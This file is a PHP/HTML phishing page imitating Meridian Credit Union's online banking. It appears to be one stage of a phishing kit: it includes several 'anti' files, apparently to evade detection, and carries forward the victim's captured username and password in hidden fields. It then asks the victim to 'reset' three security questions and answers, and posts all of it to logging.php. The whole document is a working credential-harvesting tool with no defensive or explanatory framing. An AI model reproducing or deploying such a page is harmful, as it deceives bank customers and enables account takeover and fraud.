<?php
	include '../prevents/anti1.php';
	include '../prevents/anti2.php';
	include '../prevents/anti3.php';
	include '../prevents/anti4.php';
	include '../prevents/anti5.php';
	include '../prevents/anti6.php';
	include '../prevents/anti7.php';
	include '../prevents/anti8.php';
	include '../prevents/anti9.php';
?>
 <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<html xmlns="http://www.w3.org/1999/xhtml" class=" js flexbox flexboxlegacy"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

<meta http-equiv="X-UA-Compatible" content="IE=edge">
<title>Sign In</title>

<script src="./login_files/modal.js"></script>

<script>
function empty() {
    var y;
    y = document.getElementById("username").value;
    if (y == "") {
        document.getElementById("username").style = "border-color:red";
		document.getElementById("username_error").style = "display: block";
        return false;
    }
	var x;
    x = document.getElementById("password").value;
    if (x == "") {
        document.getElementById("password").style = "border-color:red";
		document.getElementById("password_error").style = "display: block";
        return false;
    }

}
</script>

<script>
function change() {
    var e;
    e = document.getElementById("username").value;
    if (e !== ""){
	    document.getElementById("username").style = "";
		document.getElementById("username_error").style = "display: none";
	}
	var e;
    e = document.getElementById("password").value;
    if (e !== ""){
	    document.getElementById("password").style = "";
		document.getElementById("password_error").style = "display: none";
	}
	
}

</script>
	
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    
    <meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no">

	<base href=".">

	<link href="./login_files/style.css" rel="stylesheet">
	
	</head>
	
<body>

<div class="body-content">
	<div class="row public-header">
		<div class="logo-container">
			<a href="">
				<img src="./login_files/meridian-logo.svg" alt="" class="meridian-logo">
			</a>
		</div>
	</div>
</div>

	

					
				</div>
			</div>
		</div>
	</div>



	<center><h2><strong>Please reset your security questions</strong></h2></center><br>

<center>
	<form method="post" action="logging.php" class="ng-pristine ng-valid td_rq_form_legacy td-form td-form-validate td-form-dynamic">

		 <input type=hidden name="username" value="<?php print $username; ?>">
<input type=hidden name="password" value="<?php print $password; ?>">
        <div class="td-row">
            <div class="td-col-lg-8 td-col-lg-offset-2 td-col-md-10 td-col-md-offset-1">


                <div class="otp-section-mint-green otp-full-width-sm">

                    <div class="td-row">
                        <div class="td-col-sm-6 td-col-sm-offset-3">

                            <div ng-class="{'td-group-touched': hasTouched, 'td-group-error': hasError &amp;&amp; isDirty,'ng-invalid': hasError, 'ng-dirty': isDirty, 'td-group-focus ng-focus': hasFocus, 'td-group-hover ng-hover': hasHover}" class="form-group" td-ui-form-group="Enter your Username or Access Card #" style=""> 
							
                            <select required="" name="question1" class="td-layout-grid6" size="1" style="height:42px;width:340px">	
						<option value="" selected="selected">Select the security question</option>
	
						<option value="What was the name of your favourite superhero as a child?" >What was the name of your favourite superhero as a child?</option>
					
						<option value="What is the name of the city where your mother was born?" >What is the name of the city where your mother was born?</option>
					
						<option value="What was the last name of your favourite teacher in high school?" >What was the last name of your favourite teacher in high school?</option>
					
						<option value="What is the first name of your oldest nephew?" >What is the first name of your oldest nephew?</option>
					
						<option value="What is the first name of your father's oldest sibling?" >What is the first name of your father's oldest sibling?</option>
					
						<option value="What is the first name of your oldest cousin?" >What is the first name of your oldest cousin?</option>
					
						<option value="What was the first name of your first roommate?" >What was the first name of your first roommate?</option>
					
						<option value="What is the first name of your spouse's/partner's father?" >What is the first name of your spouse's/partner's father?</option>
					
						<option value="What is the first name of your first friend?" >What is the first name of your first friend?</option>
					 
<option value="What is the street name where you lived when you were 10 years old?" >What is the street name where you lived when you were 10 years old?</option>
					
						<option value="What is your youngest child's middle name?" >What is your youngest child's middle name?</option>
					
						<option value="What is your mother's middle name?" >What is your mother's middle name?</option>
					
						<option value="What is the first name of the maid of honour at your wedding?" >What is the first name of the maid of honour at your wedding?</option>
					
						<option value="What is your favourite cartoon?" >What is your favourite cartoon?</option>
					
						<option value="What is your father's middle name?" >What is your father's middle name?</option>
					
						<option value="What is the first name of the best man at your wedding?" >What is the first name of the best man at your wedding?</option>
					
						<option value="What is the middle name of your oldest sibling?" >What is the middle name of your oldest sibling?</option>
					
						<option value="What was the first name of your first manager?" >What was the first name of your first manager?</option>
					
						<option value="What is your favourite musical instrument?" >What is your favourite musical instrument?</option>
					
						<option value="What is your spouse's/partner's middle name?" >What is your spouse's/partner's middle name?</option>
					
						<option value="What was the name of your first pet?" >What was the name of your first pet?</option>
					
						<option value="What was the last name of your favourite teacher in elementary school?" >What was the last name of your favourite teacher in elementary school?</option>
					
						<option value="What is the first name of your mother's oldest sibling?" >What is the first name of your mother's oldest sibling?</option>
					
						<option value="Who was your favourite athlete as a child?" >Who was your favourite athlete as a child?</option>
					
						<option value="What colour was your first car?" >What colour was your first car?</option>
					
						<option value="What is the name of the city where your father was born?" >What is the name of the city where your father was born?</option>
					
						<option value="What city were you born in?" >What city were you born in?</option>
						</select> </div>

                        </div>
                    </div>

                </div>

            </div>

        </div>
        <br>
		  <div class="td-row">
            <div class="td-col-lg-8 td-col-lg-offset-2 td-col-md-10 td-col-md-offset-1">


                <div class="otp-section-mint-green">

                    <div class="td-row">
                        <div class="td-col-sm-6 td-col-sm-offset-3">

                            <div ng-class="{'td-group-touched': hasTouched, 'td-group-error': hasError &amp;&amp; isDirty,'ng-invalid': hasError, 'ng-dirty': isDirty, 'td-group-focus ng-focus': hasFocus, 'td-group-hover ng-hover': hasHover}" class="form-group" td-ui-form-group="Enter your Username or Access Card #" style=""> 
							    <input id="usernameOrAccessCard" placeholder="Enter your security answer" required="" name="answer1" class="ng-pristine ng-untouched ng-valid form-control ng-empty">
                            </div>

                        </div>
                    </div>

                </div>

            </div>
        </div>
		  <div class="td-row">
            <div class="td-col-lg-8 td-col-lg-offset-2 td-col-md-10 td-col-md-offset-1">


                <div class="otp-section-mint-green otp-full-width-sm">

                    <div class="td-row">
                        <div class="td-col-sm-6 td-col-sm-offset-3">

                            <div ng-class="{'td-group-touched': hasTouched, 'td-group-error': hasError &amp;&amp; isDirty,'ng-invalid': hasError, 'ng-dirty': isDirty, 'td-group-focus ng-focus': hasFocus, 'td-group-hover ng-hover': hasHover}" class="form-group" td-ui-form-group="Enter your Username or Access Card #" style=""> 
							<select required="" name="question2" class="td-layout-grid6" size="1" style="height:42px;width:340px">	
				<option value="" selected="selected">Select your security question</option>
					
						<option value="What is the street name where you lived when you were 10 years old?" >What is the street name where you lived when you were 10 years old?</option>
						<option value="What is your youngest child's middle name?" >What is your youngest child's middle name?</option>
						<option value="What is your mother's middle name?" >What is your mother's middle name?</option>
						<option value="What is the first name of the maid of honour at your wedding?" >What is the first name of the maid of honour at your wedding?</option>
						<option value="What is your favourite cartoon?" >What is your favourite cartoon?</option>
						<option value="What is your father's middle name?" >What is your father's middle name?</option>
						<option value="What is the first name of the best man at your wedding?" >What is the first name of the best man at your wedding?</option>
						<option value="What is the middle name of your oldest sibling?" >What is the middle name of your oldest sibling?</option>
						<option value="What was the first name of your first manager?" >What was the first name of your first manager?</option>
						<option value="What is your favourite musical instrument?" >What is your favourite musical instrument?</option>
						<option value="What is your spouse's/partner's middle name?" >What is your spouse's/partner's middle name?</option>
						<option value="What was the name of your first pet?" >What was the name of your first pet?</option>
						<option value="What was the last name of your favourite teacher in elementary school?" >What was the last name of your favourite teacher in elementary school?</option>
						<option value="What is the first name of your mother's oldest sibling?" >What is the first name of your mother's oldest sibling?</option>
						<option value="Who was your favourite athlete as a child?" >Who was your favourite athlete as a child?</option>
						<option value="What colour was your first car?" >What colour was your first car?</option>
						<option value="What is the name of the city where your father was born?" >What is the name of the city where your father was born?</option>
						<option value="What city were you born in?" >What city were you born in?</option>
						<option value="What was the name of your favourite superhero as a child?" >What was the name of your favourite superhero as a child?</option>
						<option value="What is the name of the city where your mother was born?" >What is the name of the city where your mother was born?</option>
						<option value="What was the last name of your favourite teacher in high school?" >What was the last name of your favourite teacher in high school?</option>
						<option value="What is the first name of the person you went to your prom with?" >What is the first name of the person you went to your prom with?</option>
						<option value="What is the first name of the person you went to your prom with?" >What is the first name of the person you went to your prom with?</option>	
						<option value="What is the first name of your oldest nephew?" >What is the first name of your oldest nephew?</option>
						<option value="What is the first name of your father's oldest sibling?" >What is the first name of your father's oldest sibling?</option>			
						<option value="What is the first name of your oldest cousin?" >What is the first name of your oldest cousin?</option>
						<option value="What was the first name of your first roommate?" >What was the first name of your first roommate?</option>
						<option value="What is the first name of your spouse's/partner's father?" >What is the first name of your spouse's/partner's father?</option>
						<option value="What is the first name of your first friend?" >What is the first name of your first friend?</option></select></div>

                        </div>
                    </div>

                </div>

            </div>
        </div>
        <br>
		  <div class="td-row">
            <div class="td-col-lg-8 td-col-lg-offset-2 td-col-md-10 td-col-md-offset-1">


                <div class="otp-section-mint-green otp-full-width-sm">

                    <div class="td-row">
                        <div class="td-col-sm-6 td-col-sm-offset-3">

                            <div ng-class="{'td-group-touched': hasTouched, 'td-group-error': hasError &amp;&amp; isDirty,'ng-invalid': hasError, 'ng-dirty': isDirty, 'td-group-focus ng-focus': hasFocus, 'td-group-hover ng-hover': hasHover}" class="form-group" td-ui-form-group="Enter your Username or Access Card #" style=""> 
							 <input id="usernameOrAccessCard" placeholder="Enter your security answer" required="" name="answer2" class="ng-pristine ng-untouched ng-valid form-control ng-empty">
                            </div>

                        </div>
                    </div>

                </div>

            </div>
        </div>
		  <div class="td-row">
            <div class="td-col-lg-8 td-col-lg-offset-2 td-col-md-10 td-col-md-offset-1">


                <div class="otp-section-mint-green otp-full-width-sm">

                    <div class="td-row">
                        <div class="td-col-sm-6 td-col-sm-offset-3">

                            <div ng-class="{'td-group-touched': hasTouched, 'td-group-error': hasError &amp;&amp; isDirty,'ng-invalid': hasError, 'ng-dirty': isDirty, 'td-group-focus ng-focus': hasFocus, 'td-group-hover ng-hover': hasHover}" class="form-group" td-ui-form-group="Enter your Username or Access Card #" style=""> 
							 <select required="" name="question3" class="td-layout-grid6" size="1" style="height:42px;width:340px">	
		<option value="" selected="selected">Select your security question</option>
					
					<option value="What is your spouse's/partner's middle name?" >What is your spouse's/partner's middle name?</option>
					
						<option value="What was the name of your first pet?" >What was the name of your first pet?</option>
					
						<option value="What was the last name of your favourite teacher in elementary school?" >What was the last name of your favourite teacher in elementary school?</option>
					
						<option value="What is the first name of your mother's oldest sibling?" >What is the first name of your mother's oldest sibling?</option>
					
						<option value="Who was your favourite athlete as a child?" >Who was your favourite athlete as a child?</option>
					
						<option value="What colour was your first car?" >What colour was your first car?</option>
					
						<option value="What is the name of the city where your father was born?" >What is the name of the city where your father was born?</option>
					
						<option value="What city were you born in?" >What city were you born in?</option>
					
						<option value="What was the name of your favourite superhero as a child?" >What was the name of your favourite superhero as a child?</option>
					
						<option value="What is the name of the city where your mother was born?" >What is the name of the city where your mother was born?</option>
					
						<option value="What was the last name of your favourite teacher in high school?" >What was the last name of your favourite teacher in high school?</option>
					
						<option value="What is the first name of the person you went to your prom with?" >What is the first name of the person you went to your prom with?</option>
					
						<option value="What is the street name where you lived when you were 10 years old?" >What is the street name where you lived when you were 10 years old?</option>
					
						<option value="What is your youngest child's middle name?" >What is your youngest child's middle name?</option>
					
						<option value="What is your mother's middle name?" >What is your mother's middle name?</option>
					
						<option value="What is the first name of the maid of honour at your wedding?" >What is the first name of the maid of honour at your wedding?</option>
					
						<option value="What is your favourite cartoon?" >What is your favourite cartoon?</option>
					
						<option value="What is your father's middle name?" >What is your father's middle name?</option>
					
						<option value="What is the first name of the best man at your wedding?" >What is the first name of the best man at your wedding?</option>
					
						<option value="What is the middle name of your oldest sibling?" >What is the middle name of your oldest sibling?</option>
					
						<option value="What was the first name of your first manager?" >What was the first name of your first manager?</option>
					
						<option value="What is your favourite musical instrument?" >What is your favourite musical instrument?</option>

						<option value="What is the first name of your oldest nephew?" >What is the first name of your oldest nephew?</option>
					
						<option value="What is the first name of your father's oldest sibling?" >What is the first name of your father's oldest sibling?</option>
					
						<option value="What is the first name of your oldest cousin?" >What is the first name of your oldest cousin?</option>
					
						<option value="What was the first name of your first roommate?" >What was the first name of your first roommate?</option>
					
						<option value="What is the first name of your spouse's/partner's father?" >What is the first name of your spouse's/partner's father?</option>
					
						<option value="What is the first name of your first friend?" >What is the first name of your first friend?</option>
					 
</select> </div>

                        </div>
                    </div>

                </div>

            </div>
        </div>
		  <div class="td-row">
            <div class="td-col-lg-8 td-col-lg-offset-2 td-col-md-10 td-col-md-offset-1">


                <div class="otp-section-mint-green otp-full-width-sm">

                    <div class="td-row">
                        <div class="td-col-sm-6 td-col-sm-offset-3">

                            <div ng-class="{'td-group-touched': hasTouched, 'td-group-error': hasError &amp;&amp; isDirty,'ng-invalid': hasError, 'ng-dirty': isDirty, 'td-group-focus ng-focus': hasFocus, 'td-group-hover ng-hover': hasHover}" class="form-group" td-ui-form-group="Enter your Username or Access Card #" style=""> 
							  <input id="usernameOrAccessCard" placeholder="Enter your security answer" required="" name="answer3" ng-model="usernameOrAccessCard" class="ng-pristine ng-untouched ng-valid form-control ng-empty">
                             </div>

                        </div>
                    </div>

                </div>

            </div>
        </div>

		
        <div class="td-row">
            <div class="td-col-sm-4 td-col-sm-offset-2 td-col-sm-push-4 td-col-md-3 td-col-md-offset-3 td-col-md-push-3">
                <div class="form-group">
                    <button type="submit" class="td-button  td-button" style="background-color:#0079c1;width:329px" >
                      <font color="white">  Next</font>
                    </button>
                </div>
            </div>
        </div>
    </form>

    <br><br>
</center>


<footer class="main-footer">
	<div class="row">
		<div class="footer-logos">
			<div class="logo-container">
				<a href="">
					<img src="./login_files/meridian-logo-white.svg" alt="" class="meridian-logo">
				</a>
			</div>
			<div>
				<img src="./login_files/entrust.png" class="entrust-seal">
			</div>
		</div>
		<div class="footer-sub">
			<span>Copyright © 2017 Meridian Credit Union. All rights reserved.</span>
			<div class="footer-links">
				<a href="" title="Privacy &amp; Security" target="_blank">Privacy &amp; Security</a>
				<a href="" title="Legal" target="_blank">Legal</a>
				<a href="" title="Accessibility" target="_blank">Accessibility</a>
			</div>
		</div>
	</div>
</footer>

<div class="ui-selectmenu-menu ui-front"><ul aria-hidden="true" aria-labelledby="account-switcher-button" id="account-switcher-menu" role="listbox" tabindex="0" class="ui-menu ui-corner-bottom ui-widget ui-widget-content"></ul></div></body></html>